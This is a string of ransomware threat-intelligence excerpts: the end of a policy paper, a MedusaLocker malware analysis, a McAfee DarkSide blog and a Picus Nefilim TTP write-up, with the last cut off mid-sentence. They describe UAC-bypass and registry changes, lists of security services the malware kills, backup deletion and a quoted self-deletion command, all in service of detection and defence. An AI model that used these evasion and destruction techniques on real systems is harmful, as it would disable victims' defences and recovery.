\nwhere criminal and state-directed intrusion activity are \nbifurcated and instead recognize a continuum of behav-\niors and actions where the two can blend together for \nambiguous results. Second, based on this recognition \nof indeterminate boundaries between criminal and state \nactivity, organizations should be incentivized to share \nwithin trusted parties and relationships as much informa-\ntion about incidents and intrusions as possible, so as to \nfacilitate the identification of trends and patterns indica-\ntive of coordinated operations associated with widespread \ndisruptive campaigns. Lastly, current economic models \ndo not accurately capture risk or correctly reward behav-\niors necessary for responding to an environment where \ncriminal and state entities can blend together in action \nand immediate impact. Reforming such systems, provid-\ning alternative means of support for companies suffering \nfrom widespread network intrusion ransomware events, \nand using these changes to build more robust defense \nand detection will repel both criminal and state-nexus \nentities and produce a more robust security ecosystem \nfor all involved stakeholders.\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED

MedusaLocker actors typically gain\naccess to victims’ networks by exploiting vulnerabilities in Remote Desktop Protocol (RDP).\n\nOnce Threat Actors (TAs) gain access to the network, they encrypt the victim’s data and leave a ransom\nnote with instructions on how victims can communicate with the TAs in every folder while encrypting files.\nThe ransom note tells victims to make a ransom payment to TA’s crypto wallet address.\n\nMedusaLocker appears to work on Ransomware-as-a-Service (RaaS) model, which allows cybercriminals\nto rent the ransomware and its services from the developer. In the RaaS model, ransomware operators\ndevelop the ransomware and a Command and Control panel which is then used by the affiliates to launch\nransomware attacks on the targets selected by their affiliates. After a successful operation, the\nransomware operators and affiliates divide the ransom extorted from victims.\n\nFigure 1 illustrates the countries that have been targeted by the ransomware group since January 2023,\nwith a total of 24 victims worldwide.\n\nhttps://blog.cyble.com/2023/03/15/unmasking-medusalocker-ransomware/\n\n\n2/17\n\nFigure 1 – Map Showing Targets of MedusaLocker\nMedusaLocker ransomware gang is known to target Hospital and Healthcare industries, but additionally,\nthe gang also targets industries such as Education and Government organizations.\n\nThe figure below shows the industries targeted by the MedusaLocker Ransomware.\n\nFigure 2 – Industries Targeted by MedusaLocker\nThe United States of America is the biggest target for all ransomware groups; MedusaLocker also follows\nthis trend, where the largest numbers of the victims are from the United States of America.\n\nHowever, victims of MedusaLocker ransomware are scattered across all continents, excluding Antarctica.\nThe figure below shows the countries of the affected targets.\n\n\n\n3/17\n\nFigure 3 – Countries Targeted by MedusaLocker\n\nTechnical Details\n\nAccording to CISA, the MedusaLocker ransomware group gains initial access to the victim’s device\nthrough vulnerable Remote Desktop Protocol (RDP) configurations. The TAs also use phishing and spear\nphishing emails in their campaigns to target possible victims.\n\nThe malware sample we have identified is a 32-bit Graphical User Interface (GUI) based executable\ncompiled with Microsoft Visual C/C++, with a SHA 256 hash of\n“1658a064cb5a5681eee7ea82f92a2b7a14f70268dda3fc7aad8a610434711a8f” (shown in the figure\nbelow).\n\nWe will be performing an analysis of this ransomware executable to gain insights into its operations.\n\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa22-181a\n\n\n4/17\n\nFigure 4 – MedusaLocker File Details\n\nMutex Creation:\n\nUpon execution, the MedusaLocker creates a mutex, or mutual exclusion object, as a locking mechanism\nto prevent two threads from writing to shared memory simultaneously and to avoid reinfection of the victim.\n\nThe name of the mutex is “8761ABBD-7F85-42EE-B272-A76179687C63”. It is hardcoded into the binary,\nas shown in the figure below.\n\nFigure 5 – MedusaLocker Creating Mutex\n\nChecking for Administrative Privileges:\n\nAfter acquiring the mutex, the ransomware checks for the privilege of its running process. MedusaLocker\nrequires administrative privileges in order to carry out its malicious operations without any restrictions. To\ndetermine the current privileges, the ransomware checks its own memory for a process token.\n\nTo do this, it obtains the current process and then extracts the token information from the process memory\nusing the GetTokenInformation() function. The code for checking the process’s privileges is shown in the\nfigure below.\n\n\n\n5/17\n\nFigure 6\n\n– MedusaLocker Checking for Admin Privileges\n\nPrivilege Escalation:\n\nThe ransomware checks whether the process is currently running with administrative privileges. If the\nprocess is not running with admin privileges, the ransomware employs a User Account Control (UAC)\nbypass technique to restart itself with elevated privileges.\n\nThis technique uses the Microsoft Connection Manager Profile Installer (CMSTP.exe), a command-line\nprogram to install Connection Manager service profiles. CMSTP is used to execute malicious code by\nrouting it through a proxy server.\n\nAn illustration of this technique is shown in the figure below.\n\nFigure 7 – MedusaLocker Performing Privilege Escalation\n\nDisabling UAC Prompt:\n\n\n\n6/17\n\nThe ransomware then attempts to disable the UAC prompt so that the system will not prompt for\nauthentication. To do this, it modifies the “EnableLUA” registry value located at\nSOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System to “0”. This stops UAC prompts if the\nprocess requires higher privileges to execute.\n\nIf the registry modification fails, the ransomware changes the “ConsentPromptBehaviorAdmin” registry\nvalue to “0”, allowing it to perform operations that require elevation without consent or credentials.\n\nThe code to disable the UAC prompt is shown in the figure below.\n\nFigure 8 –\n\nMedusaLocker Disabling UAC Prompt\n\nMarking the Infected System:\n\nAfter disabling the UAC prompt, MedusaLocker marks the infected system with the registry key.\nMedusaLocker creates a value “Self” in the registry key HKEY_CURRENT_USER\\SOFTWARE\\MDSLK\\\nand sets the data as “svchost.exe” to the registry value, indicating that the system has already been\ninfected by the MedusaLocker ransomware.\n\nThe figure below shows the registry entry.\n\n\n\n7/17\n\nFigure 9 –\n\nMedusaLocker creating registry marker\n\nCryptor Initialization:\n\nThe ransomware now initializes Cryptor, which performs AES-256 encryption on the victim’s files at a later\nstage. MedusaLocker ransomware contains an embedded public key which is encoded with Base64 and\nused to initialize the Cryptor.\n\nThe figure below shows the Base64 string.\n\nFigure 10 – MedusaLocker Initializing Encryption\n\n\n\n8/17\n\nPersistence:\n\nNow, the ransomware achieves persistence on the victim’s system by dropping itself into the “AppData”\nfolder as “svhost.exe”. The figure below shows the ransomware code to drop itself in the AppData Folder.\n\nFigure 11 – MedusaLocker dropping itself in AppData Folder\n\nAdditionally, the MedusaLocker Ransomware creates a Schedule Task entry in the system and launches\nitself every 15 minutes for an indefinite period.\n\nThe figure below shows the Schedule Task entry of the MedusaLocker Ransomware.\n\nFigure 12 – MedusaLocker Creating Scheduled Task Entry\n\nSystem Volume Enumeration:\n\n\n\n9/17\n\nAfter persistence, the ransomware enumerates all the logical drives in the system for further operations.\nThe figure below shows the malware’s routine for Enumerating Volumes in the system using the\nFindNextVolumeW() API.\n\nFigure 13 –\n\nMedusaLocker Enumerating the Volume Drives\n\nStopping Services:\n\nTo avoid detection and ensure efficient encryption on the victim’s machine, the MedusaLocker\nRansomware also terminates various running services, including antivirus, database, and other utility\nservices. This is done through a hardcoded list of services checked by the ransomware using the\nQueryServiceStatusEx() function. If any of the hardcoded services are found running, they are stopped\nusing CloseServiceHandle().\n\nThe figure below shows the routine for stopping services.\n\nFigure 14 – MedusaLocker\n\nStopping Services\nThe following table shows the targeted services\n\nDefwatch ccEvtMgr ccSetMgr SavRoam\n\nsqlagent Sqladhlp Culserver RTVscan\n\nSQLADHLP QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService\n\nsqlservr sqlbrowser Sqlwriter msmdsrv\n\ntomcat6 zhudongfangyu SQLADHLP vmware-usbarbitator64\n\nvmware-converter dbsrv12 dbeng8  \n\n\n\n10/17\n\nProcess Termination:\n\nAfter killing the predefined services, the ransomware enumerates the running processes using the\nCreateToolhelp32Snapshot() function and then terminates the relevant process using the\nTerminateProcess() function.\n\nThis is done by checking a hardcoded list of processes identified as being related to antivirus, databases,\nand other utility programs. After the processes have been identified, the ransomware will terminate them to\nprevent any interference with the encryption process.\n\nThe figure below shows the routine used to terminate the relevant processes.\n\nFigure 15 – MedusaLocker\n\nTerminating Processes\nThe processes targeted by the MedusaLocker ransomware are as follows:\n\nwxServer.exe wxServerView sqlservr.exe sqlmangr.exe\n\nRAgui.exe supervise.exe Culture.exe RTVscan.exe\n\nDefwatch.exe sqlbrowser.exe winword.exe QBW32.exe\n\nQBDBMgr.exe qbupdate.exe QBCFMonitorService.exe axlbridge.exe\n\nQBIDPService.exe httpd.exe fdlauncher.exe MsDtSrvr.exe\n\ntomcat6.exe java.exe 360se.exe 360doctor.exe\n\nwdswfsafe.exe fdlauncher.exe fdhost.exe GDscan.exe\n\nZhuDongFangYu.exe      \n\nDisabling Data Recovery:\n\n\n\n11/17\n\nThe Ransomware now utilizes inbuilt tools to delete the backups from the victim’s system. It runs the\ncommand prompt and executes commands that remove the shadow copies and system backups, making\nit impossible to recover the data from the infected system. As a result, the victim is compelled to pay the\nransom in order to regain access to their data.\n\nThe figure below shows the commands executed by the MedusaLocker.\n\nFigure 16 –\n\nMedusaLocker Removing the Backup from the victim’s system\nAdditionally, the ransomware executes the SHEmptyRecycleBinW() API to clear the Recycle Bin,\neffectively obstructing the victim’s ability to restore any deleted files. The code for this is shown in the\nfigure below.\n\nFigure 17 – MedusaLocker Emptying the Recycle Bin\n\nExcluding Folders from Encryption:\n\nAfter impairing data recovery, the ransomware creates a list of folders to exclude from encryption. This\nensures that the important executables and temporary files used for normal operations are not encrypted\nwhile data files are still encrypted.\n\nThe figure below shows the code for the excluded file paths.\n\n\n\n12/17\n\nFigure 18 – MedusaLocker Excluding Important\n\nFolders\n\nData Encryption:\n\nThe ransomware now begins encrypting the files in the victim’s machine. The data is encrypted using the\nAES 256 encryption algorithm, with the encryption key further encrypted by the RSA public key embedded\nin the ransomware. Without the private key, it is impossible to decrypt the AES key.\n\nThe figure below shows the code to encrypt the files.\n\n\n\n13/17\n\nFigure 19\n\n– MedusaLocker’s Encryption Routine\nWhen encrypting each file, the ransomware leaves a ransom note in the folder and adds the extension\n‘itlock4’. It also excludes multiple file extensions such as .exe, .dll, .sys, .ini, .rdp, etc. files from encryption.\n\nThe figure below shows the encrypted files and ransom note.\n\nFigure 20 – MedusaLocker Ransom note and Encrypted Files\nIn the end, MedusaLocker Ransomware presents the ransom note to its victims. The ransom note includes\na personal ID for the victim’s identification and a Tor contact page to facilitate negotiations and decrypt\nsample files.\n\nThe figure below shows the ransom note of MedusaLocker.\n\n\n\n14/17\n\nFigure 21 – Ransom note Dropped by the MedusaLocker Ransomware\n\nNetwork Activities:\n\nThe MedusaLocker checks the active network adaptor and uses Internet Control Message Protocol (ICMP)\nto scan for all connected systems.\n\nThe figure below depicts the ransomware using ICMP to scan for connected systems.\n\n\n\n15/17\n\nFigure 22 – MedusaLocker Enumerating the Network using ICMP Protocol\nAfter enumeration, the ransomware scans for SMB shares connected to the system. It creates a list of\nSMB shares, excluding any hidden shares indicated by a name starting with “$”.\n\nThe code for this scanning process is shown in the figure below.\n\nFigure\n\n23 – MedusaLocker enumerating the SMB Shares\nEventually, the ransomware propagates to all shared resources and proceeds to infect other connected\nsystems within the network.\n\nConclusion\n\nMedusaLocker ransomware is a highly sophisticated form of malicious software that can potentially cause\nsevere data losses and financial losses for its victims. This advanced ransomware is difficult to detect and\nstop, and its encryption algorithms are extremely difficult to break.\n\n\n\n16/17\n\nThere have been numerous attacks in a short period of time, targeting all kinds of industries and\ngeographic locations. More attacks from the MedusaLocker Ransomware are expected to occur in the\nfuture.\n\nOur Recommendations\n\nThe following essential cybersecurity best practices create the first line of control against attackers. We\nrecommend that our readers follow the best practices as given below:\n\nFrequent Audits, Vulnerability Assessments, and Penetration Testing of\norganizational assets, including network and software.\nMonitor incoming emails from suspicious and potentially malicious domains.\nBack-up data on different locations and implement  Business Continuity Planning (BCP).

Many of the excellent\ntechnical write-ups will detail how it operates an affiliate model that supports others to be\ninvolved within the ransomware business model (in addition to the developers). While this\nmay not be a new phenomenon, this model is actively deployed by many groups with great\neffect. Herein is the crux of the challenge: while the attention may be on DarkSide\nransomware, the harsh reality is that equal concern should be placed at Ryuk, or REVIL, or\nBabuk, or Cuba, etc. These, and other groups and their affiliates, exploit common entry\nvectors and, in many cases, the tools we see being used to move within an environment are\nthe same. While this technical paper covers DarkSide in more detail, we must stress the\nimportance of implementing best practices in securing/monitoring your network. These\nadditional publications can guide you in doing so:\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/darkside-ransomware-victims-sold-short/\nhttps://www.cnet.com/news/fbi-says-darkside-hacking-group-responsible-for-pipeline-cyberattack/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-atr-analyzes-sodinokibi-aka-revil-ransomware-as-a-service-what-the-code-tells-us/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-cuba-ransomware-campaign/\n\n\n2/10\n\nRDP Security Explained: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rdp-\nsecurity-explained/\nDefending against CUBA Ransomware: https://www.mcafee.com/blogs/other-\nblogs/mcafee-labs/mcafee-defenders-blog-cuba-ransomware-campaign/\nRansomware Defenses: https://www.mcafee.com/blogs/other-blogs/mcafee-\nlabs/mcafee-defenders-blog-reality-check-for-your-defenses/\nBuilding Adaptable Security Architecture Against NetWalker:\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-\nnetwalker/\nENS 10.7 Rolls Back the Curtain on Ransomware:\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/ens-10-7-rolls-back-the-\ncurtain-on-ransomware/\n\nDarkSide Ransomware:  What is it?\n\nAs mentioned earlier, DarkSide is a Ransomware-as-a-Service (RaaS) that offers high\nreturns for penetration-testers that are willing to provide access to networks and\ndistribute/execute the ransomware. DarkSide is an example of a RaaS whereby they actively\ninvest in development of the code, affiliates, and new features. Alongside their threat to leak\ndata, they have a separate option for recovery companies to negotiate, are willing to engage\nwith the media, and are willing to carry out a Distributed Denial of Service (DDoS) attack\nagainst victims. Those victims who do pay a ransom receive an alert from DarkSide on\ncompanies that are on the stock exchange who are breached, in return for their payment.\nPotential legal issues abound, not to mention ethical concerns, but this information could\ncertainly provide an advantage in short selling when the news breaks.\n\nThe group behind DarkSide are also particularly active. Using MVISION Insights we can\nidentify the prevalence of targets. This map clearly illustrates that the most targeted\ngeography is clearly the United States (at the time of writing). Further, the sectors primarily\ntargeted are Legal Services, Wholesale, and Manufacturing, followed by the Oil, Gas and\nChemical sectors.\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/rdp-security-explained/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-cuba-ransomware-campaign/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-reality-check-for-your-defenses/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-netwalker/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/ens-10-7-rolls-back-the-curtain-on-ransomware/\nhttps://www.mcafee.com/enterprise/en-us/lp/insights-preview.html\n\n\n3/10\n\nCoverage and Protection Advice\n\nMcAfee’s market leading EPP solution covers DarkSide ransomware with an array of early\nprevention and detection techniques.\n\nCustomers using MVISION Insights will find a threat-profile on this ransomware family that is\nupdated when new and relevant information becomes available.\n\nhttps://www.mcafee.com/blogs/enterprise/gartner-names-mcafee-a-leader-in-2021-magic-quadrant-for-endpoint-protection-platforms/\n\n\n4/10\n\nEarly Detection\n\nMVISION EDR includes detections on many of the behaviors used in the attack including\nprivilege escalation, malicious PowerShell and CobaltStrike beacons, and visibility of\ndiscovery commands, command and control, and other tactics along the attack chain. We\nhave EDR telemetry indicating early detection before the detonation of the Ransomware\npayload.\n\nPrevention\n\nENS TP provides coverage against known indicators in the latest signature set. Updates on\nnew indicators are pushed through GTI.\n\nENS ATP provides behavioral content focusing on proactively detecting the threat while also\ndelivering known IoCs for both online and offline detections.\n\nENS ATP adds two (2) additional layers of protection thanks to JTI rules that provide attack\nsurface reduction for generic ransomware behaviors and RealProtect (static and dynamic)\nwith ML models targeting ransomware threats.\n\nFor the latest mitigation guidance, please review:\n\nhttps://kc.mcafee.com/corporate/index?page=content&id=KB93354&locale=en_US\n\nTechnical Analysis\n\nThe RaaS platform offers the affiliate the option to build either a Windows or Unix version of\nthe ransomware. Depending on what is needed, we observe that affiliates are using different\ntechniques to circumvent detection, by masquerading the generated Windows binaries of\nDarkSide. Using several packers or signing the binary with a certificate are some of the\ntechniques used to do so.\n\nAs peers in our industry have described, we also observed campaigns where the affiliates\nand their hacking crew used several ways to gain initial access to their victim’s network.\n\n1. Using valid accounts, exploit vulnerabilities on servers or RDP for initial stage\n2. Next, establish a beachhead in the victim’s network by using tools like Cobalt-Strike\n\n(beacons), RealVNC, RDP ported over TOR, Putty, AnyDesk and TeamViewer.\nTeamViewer is what we also see back in the config of the ransomware sample:\n\nhttps://kc.mcafee.com/corporate/index?page=content&id=KB93354&locale=en_US\n\n\n5/10\n\nThe configuration of the ransomware contains several options to enable or disable system\nprocesses, but also the above part where it states which processes should not be killed.\n\nAs mentioned before, a lot of the current Windows samples in the wild are the 1.8 version of\nDarkSide, others are the 2.1.2.3 version. In a chat one of the actors revealed that a V3\nversion will be released soon.\n\nOn March 23 , 2021, on XSS, one of the DarkSide spokespersons announced an update of\nDarkSide as a PowerShell version and a major upgrade of the Linux variant:\n\nIn the current samples we observe, we do see the PowerShell component that is used to\ndelete the Volume Shadow copies, for example.\n\n1. Once a strong foothold has been established, several tools are used by the actors to\ngain more privileges.\n\nTools observed:\n\nMimikatz\nDumping LSASS\nIE/FireFox password dumper\nPowertool64\nEmpire\nBypassing UAC\n\n1. Once enough privileges are gained, it is time to map out the network and identify the\nmost critical systems like servers, storage, and other critical assets. A selection of the\nbelow tools was observed to have been used in several cases:\n\nBloodHound\nADFind\nADRecon\n\nrd\n\n\n\n6/10\n\nIP scan tools\nSeveral Windows native tools\nPowerShell scripts\n\nBefore distributing the ransomware around the network using tools like PsExec and\nPowerShell, data was exfiltrated to Cloud Services that would later be used on the DarkSide\nLeak page for extortion purposes. Zipping the data, using Rclone or WinSCP are some of the\nexamples observed.\n\nWhile a lot of good and in-depth analyses are written by our peers, one thing worth noting is\nthat when running DarkSide, the encryption process is fast. It is one of the areas the actors\nbrag about on the same forum and do a comparison to convince affiliates to join their\nprogram:\n\nDarkSide, like Babuk ransomware, has a Linux version. Both target *nix systems but in\nparticular VMWare ESXi servers and storage/NAS. Storage/NAS is critical for many\ncompanies, but how many of you are running a virtual desktop, hosted on a ESXi server?\n\nDarkside wrote a Linux variant that supports the encryption of ESXI server versions 5.0 – 7.1\nas well as NAS technology from Synology. They state that other NAS/backup technologies\nwill be supported soon.\n\nIn the code we clearly observe this support:\n\n\n\n7/10\n\nAlso, the configuration of the Linux version shows it is clearly looking for Virtual Disk/memory\nkind of files:\n\nAlthough the adversary recently claimed to vote for targets, the attacks are ongoing with\npacked and signed samples observed as recently as today (May 12, 2021):\n\n\n\n8/10\n\nConclusion\n\nRecently the Ransomware Task Force, a partnership McAfee is proud to be a part of,\nreleased a detailed paper on how ransomware attacks are occurring and how\ncountermeasures should be taken. As many of us have published, presented on, and\nreleased research upon, it is time to act. Please follow the links included within this blog to\napply the broader advice about applying available protection and detection in your\nenvironment against such attacks.\n\nMITRE ATT&CK Techniques Leveraged by DarkSide:\n\nData Encrypted for Impact – T1486\n\nInhibit System Recovery – T1490\n\nValid Accounts – T1078\n\nPowerShell – T1059.001\n\nService Execution – T1569.002\n\nAccount Manipulation – T1098\n\nDynamic-link Library Injection – T1055.001\n\nAccount Discovery – T1087\n\nBypass User Access Control – T1548.002\n\nhttps://securityandtechnology.org/ransomwaretaskforce/\n\n\n9/10\n\nFile Permissions Modification – T1222\n\nSystem Information Discovery – T1082\n\nProcess Discovery – T1057\n\nScreen Capture – T1113\n\nCompile After Delivery – T1027.004\n\nCredentials in Registry – T1552.002\n\nObfuscated Files or Information – T1027\n\nShared Modules – T1129\n\nWindows Management Instrumentation – T1047\n\nExploit Public-Facing Application – T1190\n\nPhishing – T1566\n\nExternal Remote Services – T1133\n\nMulti-hop Proxy – T1090.003\n\nExploitation for Privilege Escalation – T1068\n\nApplication Layer Protocol – T1071\n\nBypass User Account Control – T1548.002\n\nCommonly Used Port – T1043\n\nCompile After Delivery – T1500\n\nCredentials from Password Stores – T1555\n\nCredentials from Web Browsers – T1555.003\n\nCredentials in Registry – T1214\n\nDeobfuscate/Decode Files or Information – T1140\n\nDisable or Modify Tools – T1562.001\n\nDomain Account – T1087.002\n\nDomain Groups – T1069.002\n\n\n\n10/10\n\nDomain Trust Discovery – T1482\n\nExfiltration Over Alternative Protocol – T1048\n\nExfiltration to Cloud Storage – T1567.002\n\nFile and Directory Discovery – T1083\n\nGather Victim Network Information – T1590\n\nIngress Tool Transfer – T1105\n\nLinux and Mac File and Directory Permissions Modification – T1222.002\n\nMasquerading – T1036\n\nProcess Injection – T1055\n\nRemote System Discovery – T1018\n\nScheduled Task/Job – T1053\n\nService Stop – T1489\n\nSystem Network Configuration Discovery – T1016\n\nSystem Services – T1569\n\nTaint Shared Content – T1080\n\nUnix Shell – T1059.004\n\nRaj Samani VP, Chief Technical Officer EMEA\nRaj Samani is Chief Scientist and Fellow for the Enterprise business.

As an emerging ransomware\nfamily, Nefilim has caused dozens of high profile breaches since March 2020. In this blog post, we provide tactics,\ntechniques and procedures (TTPs) utilized by the Nefilim threat actors, since detecting and blocking TTPs used by a\nthreat is the most effective method to prevent that threat. TTPs allow us to detect potential intrusions and analyze the\nbehavior of those attempting to intrude.\n\nOur analysis uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) version 8\nframework. See the ATT&CK for Enterprise version 8.1 for all referenced threat actor tactics and techniques.\n\nThis blog describes:\n\nTTPs used by the Nefilim ransomware, categorized under MITRE ATT&CK tactics and techniques.\nAn example threat in the Picus Threat Library that can be used to simulate the TTP.\nAn example mitigation rule in the Picus Mitigation Library that can be used to prevent/detect the given TTP.\n\n \n\n1. Initial Access\n\nAdversaries use Initial Access techniques to gain a foothold in the target network.\n\n1.1 MITRE ATT&CK T1190 Exploit Public-Facing Application\n\nhttps://www.picussecurity.com/resource/blog/how-to-beat-nefilim-ransomware-attacks\nhttps://attack.mitre.org/techniques/enterprise/\n\n\n2/9\n\nNefilim operators exploit public-facing applications for initial access. They mainly use the CVE-2019-19781  Remote\nCode Execution vulnerability affecting Citrix ADC/Gateway. Picus Threat Library includes 600+ vulnerability\nexploitation threats associated with the relevant CVE (Common Vulnerabilities and Exposures) identification number.\n\nFollowing threats in the Picus Threat Library can be used to simulate this TTP:\n\nThreat ID Threat Name\n\n321318 Citrix Application Delivery Controller (ADC) and Gateway Path Traversal Vulnerability Variant-1\n\n311195 Citrix Application Delivery Controller (ADC) and Gateway Path Traversal Vulnerability Variant-2\n\nFollowing mitigation signatures can be used to prevent CVE-2019-19781 exploitation:\n\nSecurity\nProduct\n\nSignature ID Signature Name\n\nCheck Point\nNGFW\n\nasm_dynamic_prop_CVE_2019_19781 Citrix Multiple Products Directory Traversal (CVE-2019-\n19781)\n\nCisco\nFirepower\nNGFW\n\n1.52512.2, 1.52603.1 SERVER-WEBAPP Citrix ADC and Gateway arbitrary code\nexecution attempt\n\nF5 BIG-IP 200004998 Citrix NetScaler NSC_USER Remote Code Execution \n\nForcepoint\nNGFW \n\n HTTP_CRL-Citrix-Path-Traversal-CVE-2019-19781\n\nFortiGate\nIPS \n\n48653 Citrix.Application.Delivery.Controller.VPNs.Directory.Traversal\n\nFortiWeb\nWAF\n\n090501033 Known Exploits\n\nMcAfee\nNSP\n\n0x45272800 HTTP: Citrix ADC Arbitrary Code Execution Vulnerability\n(CVE-2019-19781)\n\nPalo Alto\nNetworks\nNGFW\n\n57497 Citrix Application Delivery Controller And Gateway Directory\nTraversal Vulnerability\n\nTippingPoint\nTPS\n\n36876 HTTP: Citrix Application Delivery Controller (ADC) Directory\nTraversal Vulnerability\n\n1. Execution\n\n2.1 MITRE ATT&CK T1106 Native API\n\nNefilim directly interacts with the native OS application programming interface ( API ) to execute behaviors.\n\n\n\n3/9\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule \n\n338852 Execution through API Attack Scenario 8418 New Process Creation via CreateProcess API Call\n\n1. Defense Evasion\n\n3.1 MITRE ATT&CK T1055 Process Injection\n\nThe Nefilim ransomware creates a new wermgr.exe  (the Windows error reporting manager) process and injects its\npayload to evade process-based defenses. You can read our process injection blog post for a detailed description of\nthis method.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule \n\n481103 Process Injection Attack Scenario 6443  Reflective Portable Executable Injection\n\n3.2 MITRE ATT&CK T1574.002 Hijack Execution Flow: DLL Side-Loading\n\nNefilim uses WerFault.exe  and wermgr.exe  for DLL Side Loading, a defense evasion technique used by\nadversaries to execute malicious payloads by hijacking the library manifest used to load DLLs. Werfault.exe  is the\nWindows Error Reporting binary used by many different programs to report errors.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n286264 DLL Side-Loading by using Xwizard.exe 6042 Arbitrary DLL Load\n\n3.3 MITRE ATT&CK T1562.001 Impair Defenses: Disable or Modify Tools\n\nThe Nefilim ransomware uses a batch file to stop services and kill processes in the local host. This batch file abuses\ntaskill.exe  using CMD to kill predefined services and processes in the target host. Nefilim distributes this batch\n\nfile to multiple hosts using two batch files. One of the batch files uses the ‘copy’ command, and the other one uses\nWMI with hard-coded admin credentials.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n650331 Stop Service Attack Scenario 8863 Critical Services Termination with TaskKill Tool\n\n3.4 MITRE ATT&CK T1070.004 Indicator Removal on Host: File Deletion\n\n \nNefilim removes itself from the target systems after infection with the following code:\n\ndel \"C:\\Users\\admin\\AppData\\Local\\Temp\\<ransomware_file_name>.exe\" /s /f /q\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\nhttps://www.picussecurity.com/blog/picus-10-critical-mitre-attck-techniques-t1055-process-injection?hsLang=en-gb\n\n\n4/9\n\n681453 Indicator Removal on Host Attack\nScenario\n\n6467 Defense Evasion by Windows Security Event Log\nDeletion\n\n3.5 MITRE ATT&CK T1497.003 Virtualization/Sandbox Evasion: Time Based Evasion\n\n \nNefilim uses the following  ‘timeout’ command to delay the execution of the ‘del’ command. Adversaries use this\ncommand also to evade sandbox analysis.\n\n\"C:\\Windows\\System32\\cmd.exe\" /c timeout /t 3 /nobreak\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n744943 Virtualization/Sandbox Evasion by using Timeout\nCommand in Command-Line Tool\n\n2313 Sandbox Evasion by Pausing The Command\nProcessor via Timeout Command\n\n1. Credential Access\n\nNefilim threat actor uses hard-coded admin credentials to utilize PsExec and WMI to execute commands and binaries\nin remote hosts (lateral movement). Since these credentials are hard-coded in the batch files, it must be stolen before\nthe attack with some credential access techniques.\n\n4.1. MITRE ATT&CK T1056.001 Input Capture: Keylogging\n\nThe Nefilim ransomware creates a DirectInput  object using the DirectDrawCreateEx  function to capture\nkeystrokes.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n431235 Input Capture Attack Scenario 5924 User Input Capture via PowerShell Script\n\n4.2 MITRE ATT&CK T1003 OS Credential Dumping\n\nNefilim uses the Mimikatz tool to obtain username and password information useful in gaining access to additional\nsystems in the target network.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n393510 Credential Dumping using Mimikatz Tool 4920 Password and Hash Dump via Mimikatz\n\n1. Discovery\n\nInterestingly, the batch files used by Nefilim include hard-coded Internal IP addresses, admin credentials, services,\nand processes. This means that Nefilim attacks are highly targeted attacks as the hard-coded information requires an\nintensive discovery operation prior to attacks. Dynamic analysis of the Nefilim ransomware samples shows that the\nfollowing techniques are used by Nefilim to discover the required information.\n\n\n\n5/9\n\n5.1 MITRE ATT&CK T1518.001 Software Discovery: Security Software Discovery\n\nThe Nefilim ransomware uses IsDebuggerPresent , CheckRemoteDebuggerPresent , and\nNtQueryInformationProcess  API functions to check if a user-mode debugger is running. Debuggers are used by\n\nsecurity analysts to inspect malware’s behavior at the run-time. In the presence of a debugger,  malware samples\nexhibited less malicious behavior. Moreover, Nefilim uses the NtSetInformationThread  API function to evade\ndebugging.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n112771 Security Software Discovery Attack Scenario 3379 Security Software Discovery\n\n5.2 MITRE ATT&CK T1018 Remote System Discovery\n\nNefilim reads the hosts file ( C:\\Windows\\System32\\drivers\\etc\\hosts ) to get a listing of other systems by IP\naddresses and hostnames on the network that may be used for Lateral Movement from the current system.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n101233 Gather Windows Host\nFile\n\n6813 Remote System Discovery by Obtaining Mappings of IP Addresses to Host\nNames\n\n5.3 MITRE ATT&CK T1082 System Information Discovery\n\nThe Nefilim ransomware queries volume information (disk volume name and serial number) and Cryptographic\nMachine GUID. Ransomware families use  Cryptographic Machine GUID and volume serial number to generate a\nunique identifier for the host for encryption/decryption processes.\n\nNefilim obtains Cryptographic Machine GUID by querying the value of MachineGuid  in the following Registry key:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n793307 Query Cryptographic Machine GUID\nin Registry\n\n6886 System Information Discovery via Querying MachineGuid Key\nValue in Registry\n\n5.4 MITRE ATT&CK T1083 File and Directory Discovery\n\nLike a typical ransomware TTP, Nefilim enumerates files before encrypting them. It uses some FileAPI functions such\nas FindFirstFileW , lstrcmpiW  and FindNextFileW to discover files.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n286738 File and Directory Discovery Attack\nScenario\n\n4771 Sensitive Information Discovery by Searching\nFilenames \n\n\n\n6/9\n\n1. Lateral Movement\n\nLateral Movement refers to a tactic that adversaries use to move through a network to access and control remote\nassets in the network. To accomplish Lateral Movement, 